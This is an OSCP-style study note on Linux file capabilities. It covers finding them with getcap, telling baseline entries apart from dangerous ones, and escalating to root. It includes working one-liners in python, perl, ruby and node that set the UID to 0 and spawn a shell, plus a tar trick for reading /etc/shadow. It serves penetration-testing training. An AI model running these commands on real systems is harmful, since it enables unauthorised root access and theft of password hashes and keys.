---
title: "Linux Capabilities"
slug: linux-capabilities
category: notes
handbook: oscp
tags: ["privilege-escalation", "linux"]
draft: false
pubDatetime: 2026-07-22T21:58:53+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "Capabilities split root's power into fine-grained units that can be granted to a single binary."
---
Capabilities split root's power into fine-grained units that can be granted to a single binary. A binary with the right capability performs a privileged action without being SUID root and without the owner being root, so it slips past a SUID-only sweep. When an interpreter or a file-reading tool carries a capability like `cap_setuid`, that is a direct privilege escalation, the same class of finding as a SUID binary but easy to miss. Related to [SUID Binaries](/collections/oscp/suid-binaries) and the workflow in [Privilege Escalation](/collections/oscp/privilege-escalation-linux).

## Find Capabilities

```bash
getcap -r / 2>/dev/null
```

- `-r`: recurse from the given path.
- `2>/dev/null`: hide the permission-denied noise.

[LinPEAS](/collections/oscp/linpeas) lists the same thing under "Files with capabilities", which is where it turned up on Levram:

```
/usr/bin/python3.10 cap_setuid=ep
```

The trailing flags are the capability sets the binary gets: `e` effective (active at exec), `p` permitted (allowed to use), `i` inheritable. `=ep` means the capability is on and usable, which is the state to look for.

## Baseline: What Is Always There

A capability sweep returns a much shorter list than a SUID sweep, and the default set is almost entirely networking tools that need a raw socket. All normal:

```text
/usr/bin/ping                = cap_net_raw+ep
/usr/bin/arping              = cap_net_raw+ep
/usr/bin/clockdiff           = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet          = cap_net_raw+ep
/usr/bin/fping               = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

`cap_net_raw` is the tell for the whole group: it permits crafting raw packets and nothing else. It reads no files and changes no UID, so a box whose entire `getcap` output is the block above has nothing here. Modern Debian and Ubuntu moved `ping` from SUID root to `cap_net_raw` precisely to shrink what it can do, so `ping` shows up in one sweep or the other depending on release.

Two entries look alarming and are not. On Debian 11 and later the user-namespace helpers hold exactly the capability they hand out:

```text
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/newgidmap = cap_setgid+ep
```

They are baseline, and they refuse to map any UID not already delegated in `/etc/subuid` and `/etc/subgid`, so `cap_setuid` there is not the free win it is on an interpreter. `/usr/sbin/suexec` with `cap_setuid,cap_setgid+ep` is the same shape: real, but locked to the Apache document root and its configured UID floor.

Judging a hit is a two-part test, and both parts have to hold: the capability has to be one of the dangerous set below, and the binary has to be general-purpose enough to be pointed anywhere. `cap_setuid` on `python3` is root. `cap_setuid` on `newuidmap` is a package doing its job.

Anything under `/snap/` repeats a base image and can be skipped the same way as in [SUID Binaries](/collections/oscp/suid-binaries):

```bash
getcap -r / 2>/dev/null | grep -v '^/snap/'
```

## Which Capabilities Escalate

Most capabilities are harmless on the wrong binary. The ones that matter on a general-purpose interpreter or tool:

- `cap_setuid`: change UID, so call `setuid(0)` and become root. The cleanest win.
- `cap_setgid`: change GID, useful for group-gated access.
- `cap_dac_read_search`: bypass file read permission checks, so read any file (`/etc/shadow`, root's SSH keys).
- `cap_dac_override`: bypass file read, write, and execute permission checks, so overwrite any file (`/etc/passwd`, a root cron script).
- `cap_sys_admin`, `cap_sys_ptrace`, `cap_sys_module`: broad kernel-level power, exploitable but more involved.

Look the binary up on GTFOBins under the **Capabilities** function for the exact abuse.

## cap_setuid on an Interpreter

The common case is a scripting interpreter with `cap_setuid=ep`. Set the UID to 0 and exec a shell:

```bash
# python
python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'

# perl
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/sh";'

# ruby
ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'

# node
node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```

No `-p` is needed the way it is for a SUID shell. `setuid(0)` sets the real and effective UID to 0 directly, so the shell keeps root without any privileged-mode flag. This was the root step on Levram with `/usr/bin/python3.10`.

## cap_dac_read_search for File Reads

When a binary can read any file, there is no shell escape, but every root-only file is readable. Pull the ones that lead to root:

```bash
# tar with cap_dac_read_search: archive a protected file, then extract it back
tar cf shadow.tar /etc/shadow
tar xf shadow.tar          # extracts etc/shadow under the current directory
```

Grab `/etc/shadow` to crack (see [Password Cracking](/collections/oscp/password-cracking)), or a root user's `~/.ssh/id_rsa` to log in.
